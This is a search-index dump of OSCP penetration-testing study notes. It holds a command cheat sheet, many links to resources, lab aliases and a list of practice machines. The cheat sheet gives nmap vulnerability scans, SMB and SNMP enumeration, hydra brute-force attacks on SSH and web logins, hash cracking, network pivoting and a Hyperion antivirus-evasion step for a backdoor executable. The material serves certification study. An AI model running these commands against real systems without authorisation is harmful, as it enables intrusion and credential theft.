https://awansec.com/oscp-review.html","title":"Enumeration"},{"location":"certifications/oscp/0-cheatsheet/#enumeration","text":"","title":"Enumeration"},{"location":"certifications/oscp/0-cheatsheet/#tcp","text":"nmap -sS -sV -sC -n [IP] nmap -vv -Pn -A -sC -sS -T 4 -p- 10.0.0.1","title":"TCP"},{"location":"certifications/oscp/0-cheatsheet/#udp","text":"nmap -sU -sV -n --top-ports 200 [IP]","title":"UDP"},{"location":"certifications/oscp/0-cheatsheet/#snmp-udp-161","text":"snmp-check -t [IP] -c public","title":"SNMP (UDP 161)"},{"location":"certifications/oscp/0-cheatsheet/#smtp","text":"nmap \u2013script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 10.0.0.1","title":"SMTP"},{"location":"certifications/oscp/0-cheatsheet/#snmp","text":"snmpwalk -c public -v1 10.0.0.0","title":"SNMP"},{"location":"certifications/oscp/0-cheatsheet/#smb-tcp-139tcp-445","text":"enum4linux [IP]","title":"SMB (TCP 139/TCP 445)"},{"location":"certifications/oscp/0-cheatsheet/#webdav","text":"davtest -url http(s)://[IP]","title":"WebDav"},{"location":"certifications/oscp/0-cheatsheet/#ftp","text":"ftp [IP] Username: anonymous Password: anonymous nmap \u2013script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 10.0.0.1","title":"FTP:"},{"location":"certifications/oscp/0-cheatsheet/#smb-anonymous","text":"smbclient -L \\\\[IP] Username: root Password: None enum4linux 10.0.0.1 nmap \u2013script=smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse,smbv2-enabled.nse 10.0.0.1","title":"SMB (anonymous)"},{"location":"certifications/oscp/0-cheatsheet/#mysql","text":"nmap -sV -Pn -vv \u2013script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 10.0.0.1 -p 3306","title":"MySQL"},{"location":"certifications/oscp/0-cheatsheet/#web-applications","text":"","title":"Web Applications"},{"location":"certifications/oscp/0-cheatsheet/#structure-discovery","text":"dirb http://10.0.0.1 /usr/share/wordlists/dirb/common.txt","title":"Structure Discovery"},{"location":"certifications/oscp/0-cheatsheet/#vulnerability-discovery","text":"nikto -h http(s)://[IP]:[PORT]/[DIRECTORY]","title":"Vulnerability Discovery"},{"location":"certifications/oscp/0-cheatsheet/#password-attacks","text":"https://hashkiller.co.uk john hashes.txt hashcat -m 500 -a 0 -o output.txt \u2013remove hashes.txt /usr/share/wordlists/rockyou.txt hydra 10.0.0.1 http-post-form \u201c/admin.php:target=auth mode=login user=^USER^ password=^PASS^:invalid\u201d -P /usr/share/wordlists/rockyou.txt -l admin hydra -l admin -P /usr/share/wordlists/rockyou.txt -o results.txt ssh://10.0.0.1","title":"Password Attacks"},{"location":"certifications/oscp/0-cheatsheet/#tunneling","text":"Tunnels traffic through 10.0.0.1 and makes a route for all traffic destined for 10.10.10.0/24 through your sshuttle tunnel. sshuttle -r root@10.0.0.1 10.10.10.0/24 sshuttle -l (any port) -r root@10.10.0.1 10.10.0.0/24","title":"Tunneling"},{"location":"certifications/oscp/0-cheatsheet/#av-bypassing","text":"root@kali:~/Hyperion-1.0# wine hyperion.exe ../backdoor.exe ../backdoor_mutation.exe https://github.com/furrukhtaj/Enumerator","title":"AV Bypassing"},{"location":"certifications/oscp/0-cheatsheet/#scripts-from-awansec","text":"https://awansec.com/oscp-review.html","title":"Scripts from awansec"},{"location":"certifications/oscp/_preparation/","text":"Exam Guide: https://support.offensive-security.com/oscp-exam-guide/ Exam Day Prep: https://www.vortex.id.au/2017/05/oscp-exam-preparation-exam-day-report-day/ https://guide.offsecnewbie.com/ TJNulls_Preparation_Guide: https://www.netsecfocus.com/oscp/2019/03/29/The_Journey_to_Try_Harder-_TJNulls_Preparation_Guide_for_PWK_OSCP.html Focused Cheetsheets Cheatsheets: https://ired.team/ / https://github.com/jmfrouin/Offensive-Security-OSCP-Cheatsheets OSCP-Cheatsheet-God: https://github.com/sumas/OSCP-Cheatsheet-God Guides Module Prep Guide: https://tulpasecurity.files.wordpress.com/2016/09/tulpa-pwk-prep-guide1.pdf A comprehensive guide/material for anyone looking to get into infosec or take the OSCP exam: https://github.com/RustyShackleford221/OSCP-Prep https://localhost.exposed/path-to-oscp/ https://pentesterlab.com/bootcamp https://www.cybrary.it/course/advanced-penetration-testing/ https://danielmiessler.com/study/tcpdump/ https://github.com/moshekaplan/pentesting_notes https://0xdf.gitlab.io/tags.html#oscp https://github.com/areyou1or0/OSCP https://www.xservus.com/pwndefend/hacking-101/ Sources https://jhalon.github.io/OSCP-Review/ https://www.abatchy.com/2017/03/how-to-prepare-for-pwkoscp-noob https://awansec.com/oscp-review.html https://teckk2.github.io/category/OSCP.html https://webcache.googleusercontent.com/search?q=cache:-QYejCxK0agJ:https://www.netsecfocus.com/oscp/review/2019/01/29/An_Adventure_to_Try_Harder_Tjnulls_OSCP_Journey.html+ cd=1 hl=en ct=clnk gl=lk https://web.archive.org/web/20181212154847/https://github.com/mantvydasb/Offensive-Security-OSCP-Cheatsheets https://areyou1or0.blogspot.com/2019/01/finally-oscp-may-force-be-with-you.html https://jordanpotti.com/oscp/ Sources with more tips: https://h4ck.co/oscp-journey-exam-lab-prep-tips/ Note to Check https://github.com/areyou1or0/OSCP https://github.com/nairuzabulhul/RoadMap https://gist.github.com/cokebottle/3e0916522dc09086ee45e5a93d664f16 https://www.exploit-db.com/papers/12902 Resources Pentest Monkey - Post Exploitation Without a TTY: http://pentestmonkey.net/blog/post-exploitation-without-a-tty Phineas Fisher Hacks Catalan Police Union Website: https://www.youtube.com/watch?v=oI_ZhFCS3AQ#t=25m53s Phineas Fisher - Hackingteam Writeup: http://pastebin.com/raw/0SNSvyjJ Windows / Linux Local Privilege Escalation Workshop: https://github.com/sagishahar/lpeworkshop Cheatsheets Transferring Files from Linux to Windows (post-exploitation): https://blog.ropnop.com/transferring-files-from-kali-to-windows/ Linux: Basic Linux Privilege Escalation - https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ Windows post exploration commands: http://www.handgrep.se/repository/cheatsheets/postexploitation/WindowsPost-Exploitation.pdf https://github.com/tkal/The-Security-Handbook https://github.com/absolomb/Pentesting/blob/master/guides/LinuxPrivEsc.md http://packetlife.net/library/cheat-sheets/ http://ired.team/offensive-security-experiments/offensive-security-cheetsheets https://github.com/jmfrouin/Offensive-Security-OSCP-Cheatsheets https://www.matteomalvica.com/pentesting/ https://github.com/OlivierLaflamme/Cheatsheet-God VIM: https://vim.rtorr.com/ Netcat: https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf Nmap: https://highon.coffee/blog/nmap-cheat-sheet/ Notepad++: http://www.cheat-sheets.org/saved-copy/Notepad++_Cheat_Sheet.pdf Bash: https://www.isical.ac.in/~pdslab/2016/lectures/bash_cheat_sheet.pdf Reverse Shell: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet Google: https://www.sans.org/security-resources/GoogleCheatSheet.pdf Python: https://www.tunnelsup.com/python-cheat-sheet/ Metasploit: https://www.tunnelsup.com/metasploit-cheat-sheet/ Collections windows-kernel-exploits Windows: https://github.com/SecWiki/windows-kernel-exploits http://pwnwiki.io/#!privesc/windows/index.md https://github.com/netbiosX/Checklists https://github.com/enaqx/awesome-pentest https://xapax.gitbooks.io/security/content/ NetSec Focus - Learning Resources: https://docs.google.com/spreadsheets/d/12bT8APhWsL-P8mBtWCYu4MLftwG1cPmIL25AEBtXDno/edit#gid=1556200786 https://chryzsh.gitbooks.io/pentestbook https://github.com/vitalysim/Awesome-Hacking-Resources https://guif.re/ https://github.com/danielmiessler/SecLists https://sqlwiki.netspi.com/?dbms=SQLServer Practice Boxes https://h4cklife.org/2018/05/22/a-pre-exam-for-future-oscp-students/ https://drive.google.com/open?id=1p0U9yYSObcJty5REN88EQzPeDOFauIn0 https://www.secjuice.com/writeup-lazysysadmin-vulnhub/ https://pentest.join.eset.com/dns-discovery Networking References Networking Basics: TCP, UDP, TCP/IP and OSI Model - https://www.pluralsight.com/blog/it-ops/networking-basics-tcp-udp-tcpip-osi-models Common Ports Protocols - https://pbs.twimg.com/media/DP7axHKUEAALlJB.jpg:large DNS Hacking - http://resources.infosecinstitute.com/dns-hacking/#gref Port Redirection / Tunneling - https://chamibuddhika.wordpress.com/2012/03/21/ssh-tunnelling-explained/ http://www.debianadmin.com/howto-use-ssh-local-and-remote-port-forwarding.html http://blog.trackets.com/2014/05/17/ssh-tunnel-local-and-remote-port-forwarding-explained-with-examples.html Security+ Section 1: Network Security - https://www.professormesser.com/security-plus/sy0-401/sy0-401-course-index/ Nmap Basics - https://nmap.org/bennieston-tutorial/ Understanding Guide for Nmap Ping Scan (Firewall Bypass): https://www.hackingarticles.in/understanding-guide-nmap-ping-scan-firewall-bypass/ Linux References Learn Linux from the safety of your chair using a remote private linux machine with root access: https://linuxzoo.net/ Linux Journey - https://linuxjourney.com/ OverTheWire - Bandit - http://overthewire.org/wargames/bandit/ Bash Scritping Tutorial - https://linuxconfig.org/bash-scripting-tutorial Null Byte - Linux Basics - https://null-byte.wonderhowto.com/how-to/linux-basics/ Bash for Beginners - http://www.tldp.org/LDP/Bash-Beginners-Guide/html/ Explainshell - http://www.explainshell.com/ Python References Codecademy - Python - https://www.codecademy.com/learn/learn-python Python 2.7.14 Documentation - https://docs.python.org/2/index.html Violent Python Enumeration Enumeration: http://0daysecurity.com/penetration-testing/enumeration.html SMTP - https://pentestlab.blog/2012/11/20/smtp-user-enumeration/ SNMP - http://carnal0wnage.attackresearch.com/2007/07/over-in-lso-chat-we-were-talking-about.html http://resources.infosecinstitute.com/what-is-enumeration/#gref https://www.sans.edu/cyber-research/security-laboratory/article/attacks-browsing Recon sript: https://github.com/bitsadmin/miscellaneous/blob/master/localrecon.cmd SMB: https://hackercool.com/2016/07/smb-enumeration-with-kali-linux-enum4linuxacccheck-smbmap/ Vanquish: https://github.com/frizb/Vanquish Reconnaissance with Recon-Ng, Part 1 (Getting Started): https://null-byte.wonderhowto.com/how-to/hack-like-pro-reconnaissance-with-recon-ng-part-1-getting-started-0169854/ Buffer Overflow https://www.sans.org/reading-room/whitepapers/threats/paper/481 https://github.com/justinsteven/dostackbufferoverflowgood https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/ https://www.corelan.be/index.php/2009/07/23/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2/ https://exploit-exercises.com/protostar/ http://www.opensecuritytraining.info/IntroX86.html Exploitation https://sploitfun.wordpress.com/2015/06/26/linux-x86-exploit-development-tutorial-series/ https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells https://pen-testing.sans.org/blog/2013/05/06/netcat-without-e-no-problem https://highon.coffee/blog/reverse-shell-cheat-sheet/ http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet Passing the hash with remote Desktop - https://www.kali.org/penetration-testing/passing-hash-remote-desktop/ Spawning a TTY (Interactive) Shell - https://netsec.ws/?p=337 Creating Metasploit Payloads - https://netsec.ws/?p=331 Windows exploitation https://github.com/GuardianRG/awesome-windows-exploitation https://github.com/GuardianRG/awesome-windows-exploitation/blob/d84ec32638c7362bd21b4f66639ddc9c763e7cc7/README.md https://n0where.net/awesome-windows-exploitation-resources Privilege Escalation - linux https://github.com/pentestmonkey/unix-privesc-check Linux: linuxprivchecker.py - http://www.securitysift.com/download/linuxprivchecker.py Linux: LinEnum - https://github.com/rebootuser/LinEnum http://resources.infosecinstitute.com/privilege-escalation-linux-live-examples/#gref Privilege Escalation - Windows https://github.com/pentestmonkey/windows-privesc-check Windows Privilege Escalation Methods for Pentesters: https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/ Windows:Elevating privileges by exploiting weak folder permissions - http://www.greyhathacker.net/?p=738 Windows: Windows-Exploit-Suggester - https://github.com/GDSSecurity/Windows-Exploit-Suggester Using Credentials to Own Windows Boxes - Part 1 (from Kali): https://blog.ropnop.com/using-credentials-to-own-windows-boxes/ Using Credentials to Own Windows Boxes - Part 2 (PSExec and Services): https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/ Using Credentials to Own Windows Boxes - Part 3 (WMI and WinRM): https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/- Windows: Privilege Escalation Fundamentals - http://www.fuzzysecurity.com/tutorials/16.html Practical Windows Privilege Escalation - https://www.youtube.com/watch?v=PC_iMqiuIRQ Privilege Escalation - Common MySQL Root to System Root with UDF - https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/ Client Side Attacks Metasploit Unleashed - https://www.offensive-security.com/metasploit-unleashed/client-side-attacks/ Web Attacks SQLI - https://www.exploit-db.com/papers/13045/ OverTheWire: Natas - http://overthewire.org/wargames/natas/ Learning LFI-RFI -1 - https://www.hackersonlineclub.com/lfi-rfi/ Learning LFI-RFI -2 - https://0xzoidberg.wordpress.com/category/security/lfi-rfi/ SQL Injection Cheat-sheet -1 - http://resources.infosecinstitute.com/backdoor-sql-injection/ Local file inclusion - https://www.exploit-db.com/docs/english/40992-web-app-penetration-testing---local-file-inclusion-(lfi).pdf Password Attacks https://alexandreborgesbrazil.files.wordpress.com/2013/08/introduction_to_password_cracking_part_1.pdf Practice Root-me.org https://www.rebootuser.com/ https://cmdchallenge.com/ https://vim-adventures.com/ https://lab.pentestit.ru/ https://ctf365.com/ https://pentesterlab.com/bootcamp https://exploit-exercises.com/mainsequence/ http://overthewire.org/wargames/natas/ Books Penetration Testing: A Hands-On Introduction to Hacking The Hacker Playbook 3: Practical Guide To Penetration Testing The Web Application Hacker\u2019s Handbook: Finding and Exploiting Security Flaws Black Hat Python: Python Programming for Hackers and Pentesters Hacking: The Art of Exploitation, 2nd Edition Shell https://highon.coffee/blog/reverse-shell-cheat-sheet/ Spawning a TTY Shell: https://netsec.ws/?p=337 ICMP Reverse Shell: https://resources.infosecinstitute.com/icmp-reverse-shell/#gref Payloads Creating Metasploit Payloads: https://netsec.ws/?p=331","title":" preparation"},{"location":"certifications/oscp/_preparation/#focused-cheetsheets","text":"Cheatsheets: https://ired.team/ / https://github.com/jmfrouin/Offensive-Security-OSCP-Cheatsheets OSCP-Cheatsheet-God: https://github.com/sumas/OSCP-Cheatsheet-God","title":"Focused Cheetsheets"},{"location":"certifications/oscp/_preparation/#guides","text":"Module Prep Guide: https://tulpasecurity.files.wordpress.com/2016/09/tulpa-pwk-prep-guide1.pdf A comprehensive guide/material for anyone looking to get into infosec or take the OSCP exam: https://github.com/RustyShackleford221/OSCP-Prep https://localhost.exposed/path-to-oscp/ https://pentesterlab.com/bootcamp https://www.cybrary.it/course/advanced-penetration-testing/ https://danielmiessler.com/study/tcpdump/ https://github.com/moshekaplan/pentesting_notes https://0xdf.gitlab.io/tags.html#oscp https://github.com/areyou1or0/OSCP https://www.xservus.com/pwndefend/hacking-101/","title":"Guides"},{"location":"certifications/oscp/_preparation/#sources","text":"https://jhalon.github.io/OSCP-Review/ https://www.abatchy.com/2017/03/how-to-prepare-for-pwkoscp-noob https://awansec.com/oscp-review.html https://teckk2.github.io/category/OSCP.html https://webcache.googleusercontent.com/search?q=cache:-QYejCxK0agJ:https://www.netsecfocus.com/oscp/review/2019/01/29/An_Adventure_to_Try_Harder_Tjnulls_OSCP_Journey.html+ cd=1 hl=en ct=clnk gl=lk https://web.archive.org/web/20181212154847/https://github.com/mantvydasb/Offensive-Security-OSCP-Cheatsheets https://areyou1or0.blogspot.com/2019/01/finally-oscp-may-force-be-with-you.html https://jordanpotti.com/oscp/","title":"Sources"},{"location":"certifications/oscp/_preparation/#sources-with-more-tips","text":"https://h4ck.co/oscp-journey-exam-lab-prep-tips/","title":"Sources with more tips:"},{"location":"certifications/oscp/_preparation/#note-to-check","text":"https://github.com/areyou1or0/OSCP https://github.com/nairuzabulhul/RoadMap https://gist.github.com/cokebottle/3e0916522dc09086ee45e5a93d664f16 https://www.exploit-db.com/papers/12902","title":"Note to Check"},{"location":"certifications/oscp/_preparation/#resources","text":"Pentest Monkey - Post Exploitation Without a TTY: http://pentestmonkey.net/blog/post-exploitation-without-a-tty Phineas Fisher Hacks Catalan Police Union Website: https://www.youtube.com/watch?v=oI_ZhFCS3AQ#t=25m53s Phineas Fisher - Hackingteam Writeup: http://pastebin.com/raw/0SNSvyjJ Windows / Linux Local Privilege Escalation Workshop: https://github.com/sagishahar/lpeworkshop","title":"Resources"},{"location":"certifications/oscp/_preparation/#cheatsheets","text":"Transferring Files from Linux to Windows (post-exploitation): https://blog.ropnop.com/transferring-files-from-kali-to-windows/ Linux: Basic Linux Privilege Escalation - https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ Windows post exploration commands: http://www.handgrep.se/repository/cheatsheets/postexploitation/WindowsPost-Exploitation.pdf https://github.com/tkal/The-Security-Handbook https://github.com/absolomb/Pentesting/blob/master/guides/LinuxPrivEsc.md http://packetlife.net/library/cheat-sheets/ http://ired.team/offensive-security-experiments/offensive-security-cheetsheets https://github.com/jmfrouin/Offensive-Security-OSCP-Cheatsheets https://www.matteomalvica.com/pentesting/ https://github.com/OlivierLaflamme/Cheatsheet-God VIM: https://vim.rtorr.com/ Netcat: https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf Nmap: https://highon.coffee/blog/nmap-cheat-sheet/ Notepad++: http://www.cheat-sheets.org/saved-copy/Notepad++_Cheat_Sheet.pdf Bash: https://www.isical.ac.in/~pdslab/2016/lectures/bash_cheat_sheet.pdf Reverse Shell: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet Google: https://www.sans.org/security-resources/GoogleCheatSheet.pdf Python: https://www.tunnelsup.com/python-cheat-sheet/ Metasploit: https://www.tunnelsup.com/metasploit-cheat-sheet/","title":"Cheatsheets"},{"location":"certifications/oscp/_preparation/#collections","text":"windows-kernel-exploits Windows: https://github.com/SecWiki/windows-kernel-exploits http://pwnwiki.io/#!privesc/windows/index.md https://github.com/netbiosX/Checklists https://github.com/enaqx/awesome-pentest https://xapax.gitbooks.io/security/content/ NetSec Focus - Learning Resources: https://docs.google.com/spreadsheets/d/12bT8APhWsL-P8mBtWCYu4MLftwG1cPmIL25AEBtXDno/edit#gid=1556200786 https://chryzsh.gitbooks.io/pentestbook https://github.com/vitalysim/Awesome-Hacking-Resources https://guif.re/ https://github.com/danielmiessler/SecLists https://sqlwiki.netspi.com/?dbms=SQLServer","title":"Collections"},{"location":"certifications/oscp/_preparation/#practice-boxes","text":"https://h4cklife.org/2018/05/22/a-pre-exam-for-future-oscp-students/ https://drive.google.com/open?id=1p0U9yYSObcJty5REN88EQzPeDOFauIn0 https://www.secjuice.com/writeup-lazysysadmin-vulnhub/ https://pentest.join.eset.com/dns-discovery","title":"Practice Boxes"},{"location":"certifications/oscp/_preparation/#networking-references","text":"Networking Basics: TCP, UDP, TCP/IP and OSI Model - https://www.pluralsight.com/blog/it-ops/networking-basics-tcp-udp-tcpip-osi-models Common Ports Protocols - https://pbs.twimg.com/media/DP7axHKUEAALlJB.jpg:large DNS Hacking - http://resources.infosecinstitute.com/dns-hacking/#gref Port Redirection / Tunneling - https://chamibuddhika.wordpress.com/2012/03/21/ssh-tunnelling-explained/ http://www.debianadmin.com/howto-use-ssh-local-and-remote-port-forwarding.html http://blog.trackets.com/2014/05/17/ssh-tunnel-local-and-remote-port-forwarding-explained-with-examples.html Security+ Section 1: Network Security - https://www.professormesser.com/security-plus/sy0-401/sy0-401-course-index/ Nmap Basics - https://nmap.org/bennieston-tutorial/ Understanding Guide for Nmap Ping Scan (Firewall Bypass): https://www.hackingarticles.in/understanding-guide-nmap-ping-scan-firewall-bypass/","title":"Networking References"},{"location":"certifications/oscp/_preparation/#linux-references","text":"Learn Linux from the safety of your chair using a remote private linux machine with root access: https://linuxzoo.net/ Linux Journey - https://linuxjourney.com/ OverTheWire - Bandit - http://overthewire.org/wargames/bandit/ Bash Scritping Tutorial - https://linuxconfig.org/bash-scripting-tutorial Null Byte - Linux Basics - https://null-byte.wonderhowto.com/how-to/linux-basics/ Bash for Beginners - http://www.tldp.org/LDP/Bash-Beginners-Guide/html/ Explainshell - http://www.explainshell.com/","title":"Linux References"},{"location":"certifications/oscp/_preparation/#python-references","text":"Codecademy - Python - https://www.codecademy.com/learn/learn-python Python 2.7.14 Documentation - https://docs.python.org/2/index.html Violent Python","title":"Python References"},{"location":"certifications/oscp/_preparation/#enumeration","text":"Enumeration: http://0daysecurity.com/penetration-testing/enumeration.html SMTP - https://pentestlab.blog/2012/11/20/smtp-user-enumeration/ SNMP - http://carnal0wnage.attackresearch.com/2007/07/over-in-lso-chat-we-were-talking-about.html http://resources.infosecinstitute.com/what-is-enumeration/#gref https://www.sans.edu/cyber-research/security-laboratory/article/attacks-browsing Recon sript: https://github.com/bitsadmin/miscellaneous/blob/master/localrecon.cmd SMB: https://hackercool.com/2016/07/smb-enumeration-with-kali-linux-enum4linuxacccheck-smbmap/ Vanquish: https://github.com/frizb/Vanquish Reconnaissance with Recon-Ng, Part 1 (Getting Started): https://null-byte.wonderhowto.com/how-to/hack-like-pro-reconnaissance-with-recon-ng-part-1-getting-started-0169854/","title":"Enumeration"},{"location":"certifications/oscp/_preparation/#buffer-overflow","text":"https://www.sans.org/reading-room/whitepapers/threats/paper/481 https://github.com/justinsteven/dostackbufferoverflowgood https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/ https://www.corelan.be/index.php/2009/07/23/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2/ https://exploit-exercises.com/protostar/ http://www.opensecuritytraining.info/IntroX86.html","title":"Buffer Overflow"},{"location":"certifications/oscp/_preparation/#exploitation","text":"https://sploitfun.wordpress.com/2015/06/26/linux-x86-exploit-development-tutorial-series/ https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells https://pen-testing.sans.org/blog/2013/05/06/netcat-without-e-no-problem https://highon.coffee/blog/reverse-shell-cheat-sheet/ http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet Passing the hash with remote Desktop - https://www.kali.org/penetration-testing/passing-hash-remote-desktop/ Spawning a TTY (Interactive) Shell - https://netsec.ws/?p=337 Creating Metasploit Payloads - https://netsec.ws/?p=331","title":"Exploitation"},{"location":"certifications/oscp/_preparation/#windows-exploitation","text":"https://github.com/GuardianRG/awesome-windows-exploitation https://github.com/GuardianRG/awesome-windows-exploitation/blob/d84ec32638c7362bd21b4f66639ddc9c763e7cc7/README.md https://n0where.net/awesome-windows-exploitation-resources","title":"Windows exploitation"},{"location":"certifications/oscp/_preparation/#privilege-escalation-linux","text":"https://github.com/pentestmonkey/unix-privesc-check Linux: linuxprivchecker.py - http://www.securitysift.com/download/linuxprivchecker.py Linux: LinEnum - https://github.com/rebootuser/LinEnum http://resources.infosecinstitute.com/privilege-escalation-linux-live-examples/#gref","title":"Privilege Escalation - linux"},{"location":"certifications/oscp/_preparation/#privilege-escalation-windows","text":"https://github.com/pentestmonkey/windows-privesc-check Windows Privilege Escalation Methods for Pentesters: https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/ Windows:Elevating privileges by exploiting weak folder permissions - http://www.greyhathacker.net/?p=738 Windows: Windows-Exploit-Suggester - https://github.com/GDSSecurity/Windows-Exploit-Suggester Using Credentials to Own Windows Boxes - Part 1 (from Kali): https://blog.ropnop.com/using-credentials-to-own-windows-boxes/ Using Credentials to Own Windows Boxes - Part 2 (PSExec and Services): https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/ Using Credentials to Own Windows Boxes - Part 3 (WMI and WinRM): https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/- Windows: Privilege Escalation Fundamentals - http://www.fuzzysecurity.com/tutorials/16.html Practical Windows Privilege Escalation - https://www.youtube.com/watch?v=PC_iMqiuIRQ","title":"Privilege Escalation - Windows"},{"location":"certifications/oscp/_preparation/#privilege-escalation-common","text":"MySQL Root to System Root with UDF - https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/","title":"Privilege Escalation - Common"},{"location":"certifications/oscp/_preparation/#client-side-attacks","text":"Metasploit Unleashed - https://www.offensive-security.com/metasploit-unleashed/client-side-attacks/","title":"Client Side Attacks"},{"location":"certifications/oscp/_preparation/#web-attacks","text":"SQLI - https://www.exploit-db.com/papers/13045/ OverTheWire: Natas - http://overthewire.org/wargames/natas/ Learning LFI-RFI -1 - https://www.hackersonlineclub.com/lfi-rfi/ Learning LFI-RFI -2 - https://0xzoidberg.wordpress.com/category/security/lfi-rfi/ SQL Injection Cheat-sheet -1 - http://resources.infosecinstitute.com/backdoor-sql-injection/ Local file inclusion - https://www.exploit-db.com/docs/english/40992-web-app-penetration-testing---local-file-inclusion-(lfi).pdf","title":"Web Attacks"},{"location":"certifications/oscp/_preparation/#password-attacks","text":"https://alexandreborgesbrazil.files.wordpress.com/2013/08/introduction_to_password_cracking_part_1.pdf","title":"Password Attacks"},{"location":"certifications/oscp/_preparation/#practice","text":"Root-me.org https://www.rebootuser.com/ https://cmdchallenge.com/ https://vim-adventures.com/ https://lab.pentestit.ru/ https://ctf365.com/ https://pentesterlab.com/bootcamp https://exploit-exercises.com/mainsequence/ http://overthewire.org/wargames/natas/","title":"Practice"},{"location":"certifications/oscp/_preparation/#books","text":"Penetration Testing: A Hands-On Introduction to Hacking The Hacker Playbook 3: Practical Guide To Penetration Testing The Web Application Hacker\u2019s Handbook: Finding and Exploiting Security Flaws Black Hat Python: Python Programming for Hackers and Pentesters Hacking: The Art of Exploitation, 2nd Edition","title":"Books"},{"location":"certifications/oscp/_preparation/#shell","text":"https://highon.coffee/blog/reverse-shell-cheat-sheet/ Spawning a TTY Shell: https://netsec.ws/?p=337 ICMP Reverse Shell: https://resources.infosecinstitute.com/icmp-reverse-shell/#gref","title":"Shell"},{"location":"certifications/oscp/_preparation/#payloads","text":"Creating Metasploit Payloads: https://netsec.ws/?p=331","title":"Payloads"},{"location":"certifications/oscp/lab-setup/","text":"Lab Setup External Sources Terminator Configuration / Zsh: https://guide.offsecnewbie.com/kali-configuration/terminator-shortcuts CherryTree template: https://guide.offsecnewbie.com/cherrytree-oscp-template Aliases ## ALIASES alias vpn='openvpn /root/pwnshare/VPN/OS-XXXXX-PWK.ovpn' alias rdp='rdesktop -g 85% -u offsec -p PASSWORD_HERE 10.11.14.134 ' alias mapshare='ln -s /mnt/hgfs/Pwn_Share/ /root/pwnshare' alias l='ls -la' alias webup='python -m SimpleHTTPServer 80' // run tcpdump\u2019s from VPN interface and to only look at source IP\u2019s from the other attackers range and with a destination of my assigned IP alias shieldsup='tcpdump -i tap0 -nnvv src net 10.11.0.0/24 and dst 10.11.0.54 -w - | tee capture.pcap | tcpdump -n -r -' alias ss='searchsploit $1' alias ssx='searchsploit -x $1' Important Locations /etc/ /etc/passwd /etc/fstab /etc/hosts /etc/init.d /usr/sbin","title":"Lab Setup"},{"location":"certifications/oscp/lab-setup/#lab-setup","text":"","title":"Lab Setup"},{"location":"certifications/oscp/lab-setup/#external-sources","text":"Terminator Configuration / Zsh: https://guide.offsecnewbie.com/kali-configuration/terminator-shortcuts CherryTree template: https://guide.offsecnewbie.com/cherrytree-oscp-template","title":"External Sources"},{"location":"certifications/oscp/lab-setup/#aliases","text":"## ALIASES alias vpn='openvpn /root/pwnshare/VPN/OS-XXXXX-PWK.ovpn' alias rdp='rdesktop -g 85% -u offsec -p PASSWORD_HERE 10.11.14.134 ' alias mapshare='ln -s /mnt/hgfs/Pwn_Share/ /root/pwnshare' alias l='ls -la' alias webup='python -m SimpleHTTPServer 80' // run tcpdump\u2019s from VPN interface and to only look at source IP\u2019s from the other attackers range and with a destination of my assigned IP alias shieldsup='tcpdump -i tap0 -nnvv src net 10.11.0.0/24 and dst 10.11.0.54 -w - | tee capture.pcap | tcpdump -n -r -' alias ss='searchsploit $1' alias ssx='searchsploit -x $1'","title":"Aliases"},{"location":"certifications/oscp/lab-setup/#important-locations","text":"/etc/ /etc/passwd /etc/fstab /etc/hosts /etc/init.d /usr/sbin","title":"Important Locations"},{"location":"certifications/oscp/notes/","text":"Notes Networking OSI / TCP / UDP https://www.pluralsight.com/blog/it-ops/networking-basics-tcp-udp-tcpip-osi-models","title":"Notes"},{"location":"certifications/oscp/notes/#notes","text":"","title":"Notes"},{"location":"certifications/oscp/notes/#networking","text":"","title":"Networking"},{"location":"certifications/oscp/notes/#osi-tcp-udp","text":"https://www.pluralsight.com/blog/it-ops/networking-basics-tcp-udp-tcpip-osi-models","title":"OSI / TCP / UDP"},{"location":"certifications/oscp/practice-vulnhub/","text":"Practice Beginner friendly Kioptrix 1 Kioptrix 2 Kioptrix 3 Kioptrix 4 Intermediate Kioptrix 5 Kioptrix 2014 Brainpan 1 MrRobot Vulnix Unknown Complexity FristiLeaks Stapler PwnLab VulnOS Wintermute 